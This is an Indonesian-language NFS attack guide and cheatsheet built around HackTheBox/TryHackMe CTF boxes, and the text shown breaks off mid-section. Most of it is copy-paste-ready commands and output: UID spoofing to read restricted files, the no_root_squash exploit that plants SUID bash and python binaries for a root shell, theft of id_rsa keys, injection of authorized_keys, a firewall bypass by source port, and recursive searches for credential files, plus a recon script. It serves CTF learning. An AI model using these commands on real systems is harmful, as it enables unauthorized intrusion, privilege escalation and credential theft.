+-----------------------+-----------------------------------+-------------------------------------+---------------------------------------------+
| Ekspor Direktori      | Seluruh struktur sistem file OS   | Membaca `/etc/shadow`, memodifikasi | Batasi share hanya ke folder data spesifik  |
| Root (`/`)            | diekspos ke jaringan.             | file `cron`, menimpa binary sistem. | non-kritis (jangan pernah mengekspor `/`).  |
+-----------------------+-----------------------------------+-------------------------------------+---------------------------------------------+
| Ekspor Folder Home    | Kredensial privat pengguna        | Menyalin `.ssh/id_rsa` atau         | Jangan pernah mengekspor folder `/home` via |
| (`/home/<user>`)      | (SSH Keys, bash history) bocor.   | menanam file `authorized_keys`.     | NFSv2/v3 tanpa proteksi enkripsi.           |
+-----------------------+-----------------------------------+-------------------------------------+---------------------------------------------+
| NFSv3 Tanpa Kerberos  | Identitas pengguna (UID/GID)      | Penyerang membuat user lokal dengan | Migrasi ke NFSv4 dengan otentikasi          |
| (AUTH_SYS)            | dipercayai tanpa otentikasi.      | UID identik (**UID Spoofing**).     | **Kerberos (RPCSEC_GSS)**.                  |
+-----------------------+-----------------------------------+-------------------------------------+---------------------------------------------+
```

---

## 🌳 BAGIAN 7: MASTER DECISION TREE NFS

```text
                         [PORT 111 / 2049 TERDETEKSI TERBUKA]
                                          │
                                          ▼
                             [JALANKAN: showmount -e $TARGET]
                                          │
                    ┌─────────────────────┴─────────────────────┐
                    │                                           │
           [EXPORT LIST MUNCUL]                        [ERROR / ACCESS DENIED]
                    │                                           │
                    ▼                                           ▼
      [BUAT MOUNT POINT & MOUNT]                      [PORTMAPPER FILTERED / GPO]
   sudo mount -t nfs -o nolock $TARGET:/share /mnt              │
                    │                                 [Coba paksa versi: -o nfsvers=3]
                    ▼                                 [Cek port UDP 111 via Nmap]
        [ANALISIS ISI DIREKTORI]                                │
             (ls -lan /mnt)                                     ▼
                    │                                 [Lanjut ke service lain]
        ┌───────────┴───────────┐
        │                       │
 [FILE BISA DIBACA]      [PERMISSION DENIED (-rw-------)]
        │                       │
        ▼                       ▼
 1. Cek .ssh/id_rsa     [CATAT NOMOR UID PEMILIK (misal: 1001)]
 2. Cek config file             │
 3. Cek backup .tar             ▼
        │              [UID SPOOFING ATTACK]
        │              sudo useradd -u 1001 dummy_user
        │              sudo su dummy_user
        │              cat /mnt/secret_file
        │                       │
        └───────────┬───────────┘
                    │
                    ▼
     [APAKAH PUNYA LOW-PRIV SHELL DI TARGET?]
                    │
           ┌────────┴────────┐
           │                 │
         [YES]              [NO]
           │                 │
           ▼                 ▼
[BACA: /etc/exports]     [GUNAKAN KREDENSIAL / SSH KEY]
           │             Login SSH ke server target
           ▼
[APAKAH ADA OPSI 'no_root_squash'?]
           │
     ┌─────┴─────┐
     │           │
   [YES]        [NO]
     │           │
     ▼           ▼
[NO_ROOT_SQUASH EXPLOIT]    [CARI JALUR PRIVESC LAIN]
1. Di Parrot (Root):        (Sudo -l, SUID lokal, Cron Jobs)
   cp /bin/bash /mnt/rootbash
   chmod +xs /mnt/rootbash
2. Di Target Terminal:
   /share/rootbash -p
     │
     ▼
[ROOT SHELL ACHIEVED!]
```

---

## 🔧 BAGIAN 8: COMMON ERRORS & TROUBLESHOOTING (10 ERROR SOLUTIONS)

### 1. `showmount: clnt_create: RPC: Port mapper failure - RPC: Unable to receive`
* **Penyebab**: Firewall host memblokir port 111 TCP/UDP atau service `rpcbind` sedang mati di server target.
* **Solusi CLI**: Periksa apakah port 2049 terbuka langsung dan coba gunakan Nmap showmount script:
```bash
nmap -p 111,2049 --script nfs-showmount $TARGET
```

---

### 2. `mount: /mnt/nfs: bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.<type> helper program.`
* **Penyebab**: Paket klien NFS belum terpasang di sistem operasi Parrot OS / Debian Anda.
* **Solusi CLI**: Pasang paket `nfs-common`:
```bash
sudo apt update && sudo apt install nfs-common -y
```

---

### 3. `mount.nfs: access denied by server while mounting <TARGET>:<SHARE>`
* **Penyebab**: Server target membatasi IP klien yang boleh me-mount share tersebut (misal hanya subnet internal `192.168.1.0/24`, sedangkan IP Anda berbeda).
* **Solusi CLI**: 
  1. Periksa kembali output `showmount -e $TARGET` untuk melihat subnet yang diizinkan.
  2. Jika Anda sudah memiliki foothold shell di mesin lain dalam subnet tersebut, lakukan pivot atau mount dari mesin pivot tersebut.

---

### 4. `mount.nfs: Connection refused`
* **Penyebab**: Daemon NFS (`nfsd`) tidak aktif di port 2049 meskipun port 111 terbuka.
* **Solusi CLI**: Pastikan daemon aktif menggunakan `rpcinfo -p $TARGET`. Jika program `100003` tidak muncul di tabel, NFS daemon di server sedang crash atau dimatikan.

---

### 5. Mount Berhasil tapi Direktori di `/mnt/nfs` Kosong
* **Penyebab**: Folder di server target memang belum memiliki file, atau server menerapkan pembatasan sub-direktori.
* **Solusi CLI**: Cek ruang disk menggunakan `df -h /mnt/nfs` untuk memastikan volume terpasang. Coba buat file uji coba jika share memiliki izin tulis:
```bash
touch /mnt/nfs/test.txt && ls -la /mnt/nfs/
```

---

### 6. `ls -la` Menampilkan Tanda Tanya (`??????????`) pada Izin File
* **Penyebab**: Terjadi *stale file handle* atau ketidakcocokan negosiasi atribut file antara klien dan server.
* **Solusi CLI**: Lepaskan mount dan kaitkan ulang menggunakan protokol NFSv3 murni dengan opsi `nolock`:
```bash
sudo umount -l /mnt/nfs
sudo mount -t nfs -o nfsvers=3,nolock $TARGET:/share /mnt/nfs
```

---

### 7. UID Mismatch Setelah Melakukan Spoofing
* **Penyebab**: GID (Group ID) juga di-enforce oleh file permission target (misal permission `-rw-r-----` milik grup tertentu).
* **Solusi CLI**: Buat user dummy beserta group ID yang cocok:
```bash
# Jika file dimiliki oleh UID 1001 dan GID 1002:
sudo groupadd -g 1002 targetgroup
sudo useradd -u 1001 -g targetgroup -m spoofed_user
sudo su spoofed_user
```

---

### 8. Biner SUID `rootbash` Tidak Berfungsi di Sisi Target (Tetap User Biasa)
* **Penyebab Ada 3 Kemungkinan**:
  1. Share sebenarnya **tidak** memiliki opsi `no_root_squash` (default `root_squash` aktif, sehingga biner yang disalin berubah kepemilikannya menjadi `nobody`).
  2. Anda lupa menyertakan flag `-p` saat menjalankan bash di target (`./rootbash -p`).
  3. Partisi filesystem di sisi server target di-mount dengan opsi keamanan **`nosuid`** (mengabaikan bit SUID).
* **Solusi & Verifikasi Akurat**:
```bash
# 1. Dari sisi shell target, pastikan opsi no_root_squash tertulis di /etc/exports:
cat /etc/exports

# 2. Atau uji langsung dari sisi Parrot OS (klien) setelah mount:
sudo touch /mnt/nfs/test_root_file
ls -lan /mnt/nfs/test_root_file
# ➔ Jika owner UID adalah 0 (root)      : no_root_squash AKTIF!
# ➔ Jika owner UID adalah 65534 (nobody) : root_squash AKTIF (SUID tidak akan bekerja)
sudo rm -f /mnt/nfs/test_root_file

# 3. Cek apakah partisi target menerapkan proteksi 'nosuid':
mount | grep nfs
# Jika ada kata 'nosuid', kernel server target memblokir bit SUID.
# Solusi: Beralih ke pembacaan file sensitif, backup config, atau SSH key injection.
```

---

### 9. Mount Gagal pada NFSv4 (Perlu Turun ke NFSv3)
* **Penyebab**: Server lama tidak mengimplementasikan protocol locking atau namespace NFSv4.
* **Solusi CLI**: Paksa klien menggunakan versi NFSv3:
```bash
sudo mount -t nfs -o vers=3,nolock $TARGET:/share /mnt/nfs
```

---

### 10. Terminal Freeze / Macet Saat Menjalankan `ls` atau `cd`
* **Penyebab**: Koneksi jaringan terputus saat mount NFS masih aktif (*RPC timeout*).
* **Solusi CLI**: Buka terminal baru dan lakukan lazy unmount untuk melepaskan filesystem secara paksa di background:
```bash
sudo umount -l -f /mnt/nfs
```

---

## 🏆 BAGIAN 9: REAL CTF EXAMPLES

---

### 📝 EXAMPLE 1: Classic NFS `id_rsa` Discovery ➔ User Shell

**Target**: HackTheBox — Linux Target

#### Step 1: Enumerasi Ekspor NFS
```bash
showmount -e 10.10.10.180
```
* **Output**:
```text
Export list for 10.10.10.180:
/home/ross *
```

#### Step 2: Mount Direktori Home Ross
```bash
sudo mkdir -p /mnt/ross_home
sudo mount -t nfs -o nolock 10.10.10.180:/home/ross /mnt/ross_home
```

#### Step 3: Ekstraksi SSH Private Key
```bash
ls -la /mnt/ross_home/.ssh/
# Ditemukan file: id_rsa
cp /mnt/ross_home/.ssh/id_rsa /tmp/ross_key
chmod 600 /tmp/ross_key
```

#### Step 4: Login SSH & Ambil User Flag
```bash
ssh -i /tmp/ross_key ross@10.10.10.180
# Login berhasil!
cat ~/user.txt
# Output: a1b2c3d4e5f6...[FLAG]...
```

---

### 📝 EXAMPLE 2: `no_root_squash` Misconfiguration ➔ Instant Root Shell

**Target**: HackTheBox / TryHackMe

#### Step 1: Temukan File `/etc/exports` di Shell Target
Setelah mendapatkan akses awal sebagai user `www-data`:
```bash
cat /etc/exports
```
* **Output**:
```text
/shared *(rw,sync,no_root_squash,no_subtree_check)
```

#### Step 2: Mount Share `/shared` di Parrot OS Penyerang
```bash
sudo mkdir -p /mnt/target_shared
sudo mount -t nfs -o nolock 10.10.11.150:/shared /mnt/target_shared
```

#### Step 3: Tanam Biner SUID Bash dari Parrot OS
```bash
# Di terminal Parrot OS (sebagai root):
sudo cp /bin/bash /mnt/target_shared/pwnroot
sudo chmod +xs /mnt/target_shared/pwnroot
ls -l /mnt/target_shared/pwnroot
# Output: -rwsr-sr-x 1 root root 1234567 pwnroot
```

#### Step 4: Picu Eksekusi Root di Sisi Target
```bash
# Kembali ke shell www-data di target:
cd /shared
./pwnroot -p

# Validasi shell:
whoami
# Output: root
cat /root/root.txt
```

---

### 📝 EXAMPLE 3: UID Spoofing untuk Membaca Private Database Config

**Target**: TryHackMe — Hardened Permissions Box

#### Step 1: Mount Share Publik
```bash
sudo mkdir -p /mnt/secure_data
sudo mount -t nfs -o nolock 10.10.88.45:/data /mnt/secure_data
cd /mnt/secure_data
ls -lan
```
* **Output**:
```text
-rw------- 1 1337 1337 1024 Sep  3 11:00 config_production.json
```
* Mencoba membaca langsung: `cat config_production.json` ➔ `cat: config_production.json: Permission denied`.

#### Step 2: Buat User Lokal dengan UID 1337 di Parrot OS
```bash
sudo useradd -u 1337 -m hacker1337
sudo su hacker1337
```

#### Step 3: Baca File Target Menggunakan Identitas Baru
```bash
cat /mnt/secure_data/config_production.json
```
* **Output Berhasil Terbuka**:
```json
{
  "database_host": "localhost",
  "database_user": "db_admin",
  "database_password": "SuperSecretNFSDBPassword2024!"
}
```

---

## ⚡ BAGIAN 10: CHEATSHEET NFS (COPY-PASTE READY)

Gunakan variabel environment berikut di terminal Parrot OS Anda:

```bash
export TARGET="10.10.11.200"
export MOUNT_POINT="/mnt/nfs_loot"
export REMOTE_SHARE="/var/nfs"
```

```bash
# ==========================================
# 1. DISCOVERY & ENUMERATION
# ==========================================
showmount -e $TARGET                                            # List exports share
rpcinfo -p $TARGET                                              # List RPC registered daemons
nmap -p 111,2049 --script nfs-showmount,nfs-ls $TARGET          # Nmap NSE audit

# ==========================================
# 2. MOUNTING OPERATIONS
# ==========================================
sudo mkdir -p $MOUNT_POINT                                      # Buat folder lokal
sudo mount -t nfs -o nolock $TARGET:$REMOTE_SHARE $MOUNT_POINT   # Mount NFSv3 optimal
sudo mount -t nfs -o nfsvers=3,nolock $TARGET:$REMOTE_SHARE $MOUNT_POINT # Force v3
df -h | grep nfs                                                # Cek status mount

# ==========================================
# 3. UID SPOOFING
# ==========================================
ls -lan $MOUNT_POINT                                            # Cek numeric UID target
sudo useradd -u <TARGET_UID> fakeuser                           # Buat dummy user
sudo su fakeuser                                                # Pindah ke dummy user
cat $MOUNT_POINT/restricted_file                                # Baca file sensitif

# ==========================================
# 4. NO_ROOT_SQUASH & SSH INJECTION EXPLOIT
# ==========================================
# Cek apakah no_root_squash aktif (Owner harus UID 0):
sudo touch $MOUNT_POINT/test_root && ls -lan $MOUNT_POINT/test_root && sudo rm -f $MOUNT_POINT/test_root

# Eksploitasi SUID Bash:
sudo cp /bin/bash $MOUNT_POINT/rootbash && sudo chmod +xs $MOUNT_POINT/rootbash
# Di Target: $REMOTE_SHARE/rootbash -p

# Alternatif SUID Python3:
sudo cp /usr/bin/python3 $MOUNT_POINT/rootpy && sudo chmod +xs $MOUNT_POINT/rootpy
# Di Target: $REMOTE_SHARE/rootpy -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Injeksi SSH Key (Jika RW di folder /home):
ssh-keygen -t rsa -b 4096 -f /tmp/nfs_key -N ""
sudo mkdir -p $MOUNT_POINT/.ssh && cat /tmp/nfs_key.pub | sudo tee -a $MOUNT_POINT/.ssh/authorized_keys
sudo chmod 600 $MOUNT_POINT/.ssh/authorized_keys
ssh -i /tmp/nfs_key username@$TARGET

# ==========================================
# 5. CLEANUP OPERATIONS (UNMOUNT)
# ==========================================
cd ~ && sudo umount $MOUNT_POINT                                # Unmount standar
sudo umount -l $MOUNT_POINT                                     # Lazy unmount jika macet
sudo userdel fakeuser                                           # Hapus user dummy
```

---

## ⚡ BAGIAN 11: AUTOMATION SCRIPT — `nfs_auto_recon.sh`

Script otomasi siap pakai di Parrot OS XFCE untuk mendeteksi ketersediaan NFS, mengekstrak export list, memeriksa izin write/SUID, dan menyiapkan mount point secara instan:

```bash
#!/bin/bash
# ==============================================================================
# Script Name : nfs_auto_recon.sh
# Description : Otomasi Reconnaissance NFS, Share Enumeration, & Mount Helper
# Usage       : ./nfs_auto_recon.sh <TARGET_IP>
# Example     : ./nfs_auto_recon.sh 10.10.11.200
# ==============================================================================

TARGET=$1
OUTPUT_DIR="./nfs_results_${TARGET}"
BASE_MOUNT="/mnt/nfs_${TARGET}"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <TARGET_IP>"
    echo "Contoh: $0 10.10.11.200"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo -e "\033[1;34m[*] ========================================================\033[0m"
echo -e "\033[1;34m[*] STARTING NFS AUTO RECON: Target $TARGET\033[0m"
echo -e "\033[1;34m[*] ========================================================\033[0m"

# Step 1: Port Scan 111 & 2049
echo -e "\n\033[1;33m[+] Step 1: Verifying Port 111 & 2049 TCP/UDP...\033[0m"
sudo nmap -sS -p 111,2049 -Pn "$TARGET" -oN "$OUTPUT_DIR/nmap_ports.txt" 2>/dev/null

if grep -q "open" "$OUTPUT_DIR/nmap_ports.txt"; then
    echo -e "\033[1;32m[+] Service RPC / NFS Terdeteksi Terbuka!\033[0m"
else
    echo -e "\033[1;31m[-] Port 111 dan 2049 tidak merespons atau diblokir firewall.\033[0m"
    exit 1
fi

# Step 2: RPC Services Query
echo -e "\n\033[1;33m[+] Step 2: Querying RPC Registered Programs via rpcinfo...\033[0m"
rpcinfo -p "$TARGET" > "$OUTPUT_DIR/rpcinfo.txt" 2>&1
if grep -q "nfs" "$OUTPUT_DIR/rpcinfo.txt"; then
    echo -e "\033[1;32m[+] NFS Daemon (Program 100003) Aktif di RPC Table!\033[0m"
    cat "$OUTPUT_DIR/rpcinfo.txt" | grep -E "nfs|mountd|portmapper"
else
    echo -e "\033[1;33m[-] Daemon NFS tidak ditemukan di RPC info.\033[0m"
fi

# Step 3: Showmount Export List
echo -e "\n\033[1;33m[+] Step 3: Checking Exported Shares (showmount -e)...\033[0m"
showmount -e "$TARGET" 2>&1 | tee "$OUTPUT_DIR/exports.txt"

# Step 4: Analisis Potensi Temuan Share
if grep -q "/" "$OUTPUT_DIR/exports.txt"; then
    echo -e "\n\033[1;32m[!] TIKET EMAS: Ditemukan NFS Export Share yang Tersedia!\033[0m"
    
    # Ambil share pertama yang terdeteksi
    FIRST_SHARE=$(grep "/" "$OUTPUT_DIR/exports.txt" | head -n 1 | awk '{print $1}')
    echo -e "\033[1;36m[*] Menyiapkan perintah mount otomatis untuk: $FIRST_SHARE\033[0m"
    
    sudo mkdir -p "$BASE_MOUNT"
    echo -e "\n[*] Eksekusi perintah berikut untuk me-mount share:"
    echo -e "    \033[1;32msudo mount -t nfs -o nolock $TARGET:$FIRST_SHARE $BASE_MOUNT\033[0m"
    echo -e "    \033[1;32mcd $BASE_MOUNT && ls -lan\033[0m"
else
    echo -e "\033[1;31m[-] Tidak ada share yang diekspor untuk host ini.\033[0m"
fi

echo -e "\n\033[1;34m[*] Reconnaissance selesai! Bukti tersimpan di: $OUTPUT_DIR/\033[0m"
```

```bash
# Cara Menjalankan Script di Parrot OS:
chmod +x nfs_auto_recon.sh
./nfs_auto_recon.sh 10.10.11.200
```

---

# NFS Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah kecuali diarahkan.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"         # IP tun0 kamu (VPN HTB/THM)
export LPORT="4444"
export MOUNT_DIR="/mnt/nfs_loot"
mkdir -p ~/nfs_loot/{files,creds,keys,loot}
sudo mkdir -p $MOUNT_DIR

echo "[*] Target: $TARGET | Mount: $MOUNT_DIR"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | Mount: /mnt/nfs_loot
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI PORT AKTIF

## ═══════════════════════════════════════

### Langkah 0.1 — Ping Test (Deteksi OS via TTL)

Bash

```
ping -c 3 $TARGET
```

**OUTPUT BERHASIL ✅ — TTL ~64 (Linux — NFS paling umum di Linux):**

text

```
64 bytes from 10.10.11.200: icmp_seq=1 ttl=63 time=23.1 ms
```

➡️ Target Linux — NFS sangat mungkin ada. Lanjut ke Langkah 0.2.

**OUTPUT BERHASIL ✅ — TTL ~128 (Windows — bisa ada Services for NFS):**

text

```
64 bytes from 10.10.11.200: icmp_seq=1 ttl=127 time=45.2 ms
```

➡️ Windows NFS pakai NTFS ACL, bukan UID/GID. UID Spoofing tidak berlaku tapi file looting tetap bisa.

**OUTPUT GAGAL ❌ — Request timeout:**

text

```
Request timeout for icmp_seq 0
```

➡️ Firewall blokir ICMP. Lanjut ke Langkah 0.2 dengan tambahkan `-Pn` di semua nmap.

---

### Langkah 0.2 — Deteksi Port NFS (111 + 2049)

Bash

```
# Command 1: Scan TCP dan UDP sekaligus (PENTING! NFS pakai keduanya)
sudo nmap -sS -sU -p 111,2049 -sV -Pn $TARGET -oN ~/nfs_loot/nmap_nfs.txt

# Command 2: Scan cepat jika -sU terlalu lambat
sudo nmap -sS -p 111,2049 -sV -Pn $TARGET

# Command 3: Cek port dinamis NFS (mountd, nlockmgr)
sudo nmap -sS -p 111,2049,20048,38923,41093 -Pn $TARGET
```

**OUTPUT BERHASIL ✅ — NFS aktif:**

text

```
PORT     STATE SERVICE  VERSION
111/tcp  open  rpcbind  2-4 (RPC #100000)
2049/tcp open  nfs      3-4 (RPC #100003)
```

**Cara baca output ini — PENTING:**

|Port|Status|Arti & Tindakan|
|---|---|---|
|`111 open`|rpcbind aktif|Pintu masuk, query port NFS di sini|
|`2049 open`|NFS daemon aktif|Share tersedia, lanjut ke showmount|
|`111 filtered`|Firewall|Coba langsung ke port 2049|
|`2049 filtered`|NFS diblokir|Lihat port dinamas via rpcinfo|

**OUTPUT GAGAL ❌ — Port 111 filtered, port 2049 filtered:**

text

```
111/tcp  filtered rpcbind
2049/tcp filtered nfs
```

➡️ NFS diblokir firewall. Coba:

Bash

```
# Bypass dengan source port 53
sudo nmap -sS -p 111,2049 --source-port 53 -Pn $TARGET

# Cek apakah ada port NFS non-standar
sudo nmap -sS --top-ports 5000 -Pn $TARGET | grep -E "open|nfs|rpc"

# Jika sudah punya shell di target, cek dari dalam:
# cat /etc/exports
# rpcinfo -p localhost
```

---

### Langkah 0.3 — Query RPC Portmapper (Detail Service)

Bash

```
# Command 1: rpcinfo — lihat SEMUA service RPC yang terdaftar
rpcinfo -p $TARGET

# Command 2: Nmap NSE showmount — alternatif showmount via nmap
nmap -p 111,2049 --script nfs-showmount $TARGET

# Command 3: Nmap NSE list isi file (preview tanpa mount)
nmap -p 111,2049 --script nfs-ls $TARGET

# Command 4: Nmap NSE statfs (info disk space)
nmap -p 111,2049 --script nfs-statfs $TARGET
```

**OUTPUT BERHASIL ✅ — rpcinfo:**

text

```
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100005    1   udp  45231  mountd
    100005    3   tcp  38923  mountd
    100021    4   tcp  41093  nlockmgr
```

**Cara baca program number:**

- `100000` = portmapper (Port 111)
- `100003` = nfs daemon (Port 2049)
- `100005` = mountd (Port acak → ini port untuk mount request)
- `100021` = nlockmgr (file locking)

**OUTPUT GAGAL ❌ — rpcinfo gagal koneksi:**

text

```
rpcinfo: can't contact portmapper: RPC: Remote system error - Connection refused
```

➡️ Portmapper diblokir atau tidak aktif:

Bash

```
# Coba langsung ke port 2049
nmap -p 2049 --script nfs-showmount $TARGET

# Coba dengan timeout lebih lama
rpcinfo -T tcp -p $TARGET
```

**Lanjut ke FASE 1.**

---

## ═══════════════════════════════════════

## FASE 1: ENUMERASI NFS SHARES (EXPORT LIST)

## ═══════════════════════════════════════

> **Tujuan:** Identifikasi direktori apa yang di-export dan siapa yang boleh mount. Ini adalah langkah paling kritis di NFS.

### Langkah 1.1 — Tampilkan Export List (3 Cara)

Bash

```
# Command 1: showmount -e — PALING RELIABLE
showmount -e $TARGET

# Command 2: showmount dengan semua klien yang sedang mount
showmount -a $TARGET

# Command 3: showmount hanya direktori
showmount -d $TARGET

# Command 4: Via Nmap (jika showmount gagal)
nmap -p 111,2049 --script nfs-showmount $TARGET
```

**OUTPUT BERHASIL ✅ — Export list muncul:**

text

```
Export list for 10.10.11.200:
/var/nfs/general   (everyone)
/home/developer    10.10.11.0/24
/opt/backups       *
/                  10.10.11.50
```

**Cara baca dan tindakan LANGSUNG:**

|Export|Klien|Prioritas & Tindakan|
|---|---|---|
|`/var/nfs/general (everyone)`|Semua orang|**MOUNT SEKARANG** — tidak perlu IP whitelist|
|`/home/developer 10.10.11.0/24`|Subnet spesifik|**Jika IP kamu di range ini → MOUNT**|
|`/opt/backups *`|Wildcard = semua|**MOUNT** — kemungkinan ada backup database|
|`/ 10.10.11.50`|Root dieksport!|**JACKPOT TERTINGGI** jika kamu bisa mount|

➡️ **Set variabel dan lanjut ke FASE 2:**

Bash

```
# Set share yang paling menarik
export REMOTE_SHARE="/var/nfs/general"
export SHARE_NAME="general"
```

**OUTPUT GAGAL ❌ — clnt_create: RPC: Port mapper failure:**

text

```
showmount: clnt_create: RPC: Port mapper failure - RPC: Unable to receive
```

➡️ Port 111 diblokir atau portmapper tidak aktif:

Bash

```
# Coba langsung dengan nmap
nmap -p 111,2049 --script nfs-showmount $TARGET

# Coba dengan timeout
showmount -e $TARGET --no-headers 2>/dev/null || \
    nmap -sV -p 2049 --script nfs-showmount $TARGET
```

**OUTPUT GAGAL ❌ — Access denied:**

text

```
showmount: 10.10.11.200: Permission denied
```

➡️ Server membatasi akses showmount tapi NFS mungkin tetap accessible:

Bash

```
# Coba mount langsung tanpa showmount
sudo mount -t nfs -o nolock $TARGET:/var/nfs /mnt/nfs_loot 2>&1
sudo mount -t nfs -o nolock $TARGET:/home /mnt/nfs_loot 2>&1
sudo mount -t nfs -o nolock $TARGET:/ /mnt/nfs_loot 2>&1

# Google search: "nfs showmount permission denied enumerate shares"
```

**OUTPUT GAGAL ❌ — Export list kosong:**

text

```
Export list for 10.10.11.200:
(nothing)
```

➡️ Tidak ada share aktif. NFS terdeteksi tapi tidak ada yang di-export:

Bash

```
# Jika sudah punya shell di target, cek langsung
cat /etc/exports
systemctl status nfs-server
showmount -e localhost    # Di sisi server

# NFS mungkin ada tapi service belum aktif
# Cari service lain: SMB (port 445), FTP (21), atau database
```

---

## ═══════════════════════════════════════

## FASE 2: MOUNTING NFS SHARE

## ═══════════════════════════════════════

> **Tujuan:** Mount share ke sistem lokal Parrot OS agar bisa browsing dan analisis file.

### Langkah 2.1 — Verifikasi Dependensi & Mount

Bash

```
# Pastikan nfs-common terinstall
which showmount || sudo apt install nfs-common -y

# Buat mount point
sudo mkdir -p $MOUNT_DIR

# Command 1: Mount standar NFSv3 dengan nolock (DIREKOMENDASIKAN untuk CTF)
sudo mount -t nfs -o nolock $TARGET:$REMOTE_SHARE $MOUNT_DIR

# Command 2: Force NFSv3 eksplisit
sudo mount -t nfs -o nfsvers=3,nolock $TARGET:$REMOTE_SHARE $MOUNT_DIR

# Command 3: Mount Read-Only dulu jika tidak yakin
sudo mount -t nfs -o ro,nolock $TARGET:$REMOTE_SHARE $MOUNT_DIR

# Command 4: Verifikasi berhasil
df -h | grep nfs
mount | grep nfs
```

**OUTPUT BERHASIL ✅ — Mount sukses:**

text

```
Filesystem                          Size  Used Avail Use% Mounted on
10.10.11.200:/var/nfs/general        20G  8.2G   11G  44% /mnt/nfs_loot
```

➡️ Share berhasil di-mount! Lanjut ke **FASE 3**.

**OUTPUT GAGAL ❌ — bad option; needs /sbin/mount helper:**

text

```
mount: /mnt/nfs_loot: bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.<type> helper program.
```

➡️ Package nfs-common belum terinstall:

Bash

```
sudo apt update && sudo apt install nfs-common -y

# Retry mount
sudo mount -t nfs -o nolock $TARGET:$REMOTE_SHARE $MOUNT_DIR
```

**OUTPUT GAGAL ❌ — access denied by server:**

text

```
mount.nfs: access denied by server while mounting 10.10.11.200:/var/nfs/general
```

➡️ IP kamu di luar whitelist subnet server:

Bash

```
# Cek subnet yang diizinkan dari export list
showmount -e $TARGET

# Jika subnet adalah 10.10.11.0/24 dan IP kamu 10.10.14.5 → kamu di luar range!
# Solusi: Pivot dari host lain yang ada di subnet yang diizinkan
# Atau jika sudah punya shell: mount dari dalam target itu sendiri

# Cek IP tun0 kamu
ip addr show tun0

# Jika di HTB/THM, biasanya IP kamu di range 10.10.14.x atau 10.13.x.x
# Share hanya untuk 10.10.11.0/24 → tidak bisa langsung mount dari Parrot
```

**OUTPUT GAGAL ❌ — Connection refused:**

text

```
mount.nfs: Connection refused
```

➡️ NFS daemon tidak aktif di port 2049:

Bash

```
# Verifikasi ulang dengan rpcinfo
rpcinfo -p $TARGET | grep nfs

# Jika program 100003 tidak muncul → NFS daemon mati
# Coba port-scan ulang
sudo nmap -sS -p 2049 -sV $TARGET
```

**OUTPUT GAGAL ❌ — Stale file handle / question marks:**

text

```
ls: cannot access '/mnt/nfs_loot': Stale file handle
```

➡️ Koneksi NFS putus atau ketidakcocokan protokol:

Bash

```
# Unmount dan remount dengan NFSv3 eksplisit
sudo umount -l $MOUNT_DIR
sudo mount -t nfs -o nfsvers=3,nolock $TARGET:$REMOTE_SHARE $MOUNT_DIR

# Cek status mount
df -h | grep nfs
```

---

## ═══════════════════════════════════════

## FASE 3: ANALISIS ISI SHARE

## ═══════════════════════════════════════

> **Tujuan:** Identifikasi file sensitif, cek UID pemilik file, dan tentukan strategi eksploitasi.

### Langkah 3.1 — List File dengan Numeric UID (WAJIB)

Bash

```
# PENTING: Gunakan -n untuk lihat UID sebagai angka, bukan nama
ls -lan $MOUNT_DIR

# Tampilkan semua file termasuk hidden
ls -lan $MOUNT_DIR/
find $MOUNT_DIR -ls 2>/dev/null | head -50

# Cari file menarik secara rekursif
find $MOUNT_DIR -type f -ls 2>/dev/null | head -100

# Hitung ukuran folder
du -sh $MOUNT_DIR/* 2>/dev/null
```

**OUTPUT BERHASIL ✅ — File dengan berbagai permission:**

text

```
drwxr-xr-x 2 1000 1000 4096 Sep  3 10:00 .
drwxr-xr-x 3    0    0 4096 Sep  3 09:00 ..
-rw-r--r-- 1 1000 1000  220 Sep  3 10:05 notes.txt
-rw------- 1 1001 1001 2602 Sep  3 10:10 id_rsa
-rw-r----- 1    0 1002  540 Sep  3 10:15 db_config.php
-rwsr-xr-x 1    0    0 1.2M Sep  3 11:00 backup_tool
```

**Analisis tiap baris — KRITIS:**

|Permission|UID|GID|File|Tindakan|
|---|---|---|---|---|
|`-rw-r--r--`|1000|1000|notes.txt|Baca langsung: `cat notes.txt`|
|`-rw-------`|1001|1001|id_rsa|**Permission Denied** → UID Spoofing ke UID 1001|
|`-rw-r-----`|0|1002|db_config.php|Butuh UID 0 (root) atau GID 1002|
|`-rwsr-xr-x`|0|0|backup_tool|Binary SUID! Analisis lebih lanjut|

➡️ **Baca file yang accessible langsung:**

Bash

```
# File yang world-readable (r--r--r--)
cat $MOUNT_DIR/notes.txt
cat $MOUNT_DIR/*.txt 2>/dev/null
cat $MOUNT_DIR/*.conf 2>/dev/null
cat $MOUNT_DIR/*.php 2>/dev/null
```

---

### Langkah 3.2 — Cari File Sensitif Secara Agresif

Bash

```
# Cari SSH private keys
find $MOUNT_DIR -name "id_rsa*" -o -name "id_ecdsa*" -o -name "*.pem" 2>/dev/null
find $MOUNT_DIR -name "authorized_keys" 2>/dev/null
find $MOUNT_DIR -path "*/.ssh/*" 2>/dev/null

# Cari file konfigurasi dengan credentials
find $MOUNT_DIR -name "*.conf" -o -name "*.config" -o -name "*.env" 2>/dev/null
find $MOUNT_DIR -name "*.php" -o -name "*.py" -o -name "*.rb" 2>/dev/null
find $MOUNT_DIR -name "wp-config.php" -o -name "settings.py" -o -name ".env" 2>/dev/null

# Cari database files
find $MOUNT_DIR -name "*.sql" -o -name "*.db" -o -name "*.sqlite" -o -name "*.kdbx" 2>/dev/null

# Cari backup archives
find $MOUNT_DIR -name "*.tar*" -o -name "*.zip" -o -name "*.gz" -o -name "*.bz2" 2>/dev/null

# Grep credentials di file yang bisa dibaca
